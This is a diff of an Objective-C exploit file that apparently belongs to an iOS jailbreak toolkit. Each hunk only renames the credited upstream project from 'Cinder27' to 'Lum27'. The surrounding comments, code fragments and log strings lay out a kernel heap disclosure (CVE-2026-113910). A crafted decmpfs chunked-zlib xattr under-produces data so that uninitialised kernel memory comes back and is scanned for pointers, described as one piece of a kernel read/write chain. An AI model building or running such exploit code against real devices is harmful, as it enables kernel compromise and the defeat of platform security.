@@ -2,8 +2,8 @@
 //  P126DecmpfsLeak.m — kernel heap DISCLOSURE through a short-producing
 //  chunked zlib xattr. p126. P007 rig.
 //
-//  Source: Cinder27 module kern.decmpfs (CVE-2026-113910 / jbjflab git,
-//  vendored at jb-sources/cinder27-jbjflab), C-twin logic ported verbatim.
+//  Source: Lum27 module kern.decmpfs (CVE-2026-113910 / jbjflab git,
+//  vendored at jb-sources/lum1na27-jbjflab), C-twin logic ported verbatim.
 //  The fleet angle: this is a kernel-content READ from a plain app —
 //  the missing read-side piece the KRW formula needed (the leak band =
 //  kernel heap; the read prong so far = p116 files + the sel-8 KVA).
@@ -12,7 +12,7 @@
 //  table promises N uncompressed bytes but each zlib stream PRODUCES fewer;
 //  AppleFSCompressionTypeZlib hands the reader the uninitialised remainder
 //  of the destination buffer. Reading the file back = scanning decoded
-//  bytes for kernel pointers. Fixed-class per Cinder27's 27.2 note (verify
+//  bytes for kernel pointers. Fixed-class per Lum27's 27.2 note (verify
 //  on 27.2: the negative control).
 //
 //  HONESTY: read-only (set xattr on OUR OWN container file, read it back,
@@ -62,7 +62,7 @@ static uint32_t p126_adler32(const uint8_t *p, size_t n) {
     return (bb << 16) | a;
 }
 
-/* the Cinder27 seed: 'cmpf' type-4 chunked zlib, per-chunk streams that
+/* the Lum27 seed: 'cmpf' type-4 chunked zlib, per-chunk streams that
  * produce `produce` bytes each while the offset table still promises the
  * full chunk span to the reader */
 static p126buf p126_chunked(size_t uncompressed, int chunk_count, size_t produce) {
@@ -94,7 +94,7 @@ static p126buf p126_chunked(size_t uncompressed, int chunk_count, size_t produce
         offsets[i] = running;
         running += (uint32_t)(1 + z.n);
     }
-    offsets[chunk_count] = running;   /* verbatim Cinder27: the table is
+    offsets[chunk_count] = running;   /* verbatim Lum27: the table is
          coherent with the CHUNKS; the LIE is the 'cmpf' header's
          uncompressed size vs the tiny streams (the under-produce = the
          reader walks past the decoded bytes into the buffer remainder) */
@@ -135,12 +135,12 @@ static void P126_rec(const char *outcome) {
     g_buf = [NSMutableString string];
     Lf(@"=== p126 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P126_BUILD);
     Lf(@"%@", [LabDeviceProfile identBlock]);
-    L(@"[law] CVE-2026-113910 (Cinder27 kern.decmpfs, vendored jbjflab): a");
+    L(@"[law] CVE-2026-113910 (Lum27 kern.decmpfs, vendored jbjflab): a");
     L(@"  crafted com.apple.decmpfs chunked-zlib xattr UNDER-PRODUCES vs its");
     L(@"  chunk table; the kernel hand-back carries the UNINITIALISED remainder");
     L(@"  = kernel heap disclosure. Scan = decoded u64 >= 0xFFFFFFE000000000.");
     L(@"  READ-ONLY class (our container file; unlink after). 27.2 = the");
-    L(@"  negative control per Cinder27's fix note.");
+    L(@"  negative control per Lum27's fix note.");
 
     NSString *docs = [NSSearchPathForDirectoriesInDomains(
         NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
@@ -206,7 +206,7 @@ static void P126_rec(const char *outcome) {
     }
 
     L(@"");
-    L(@"[twin-law] Cinder27's recorded oracle (their C twin, macOS): ");
+    L(@"[twin-law] Lum27's recorded oracle (their C twin, macOS): ");
     L(@"  'no kernel pointers surfaced (read was served plain)' — the SAME");
     L(@"  zero as ours on-device; the port is faithful. The CVE's leak needs");
     L(@"  iOS's transparent decompression to ENGAGE on the crafted file;");
@@ -222,7 +222,7 @@ static void P126_rec(const char *outcome) {
         L(@"  of the three KRW components live in the free app tonight.");
     } else {
         L(@"- 0 hits = the under-produce path is fixed/prefixed on THIS build,");
-        L(@"  or the decoder zero-fills. 27.2's fix class per Cinder27 = re-run");
+        L(@"  or the decoder zero-fills. 27.2's fix class per Lum27 = re-run");
         L(@"  on the 17's 24A435: the negative control confirms the version law.");
     }
     P126_rec(cumulative_hits > 0 ? "ok" : "lost");
